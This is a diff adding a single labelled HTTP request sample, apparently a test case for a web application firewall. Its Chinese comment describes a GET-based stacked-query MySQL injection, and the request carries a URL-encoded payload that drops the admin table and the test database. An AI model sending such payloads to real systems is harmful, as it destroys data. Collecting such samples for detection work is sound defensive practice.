@@ -1,0 +1,9 @@
+# SQL注入_GET_mysql_普通注入-06506229
+# 攻击者基于堆叠查询，将"drop table admin;drop database test"语句注入到原始SQL语句结尾，目的删除名为admin表和删除名为test的数据库。通过成功执行该SQL注入攻击，攻击者可以删除数据，进一步危害整个数据库系统的安全性。
+GET /?id=1%3Bdrop%20table%20admin%3Bdrop%20database%20test&bid=hd_tag_m8mv24f9 HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv24f9
+RM-PRO-Token: 787683addcdfc26f38c1b710603d150c
+RM-PRO-Time: 1742808379377
+User-Agent: curl/7.83.1
+
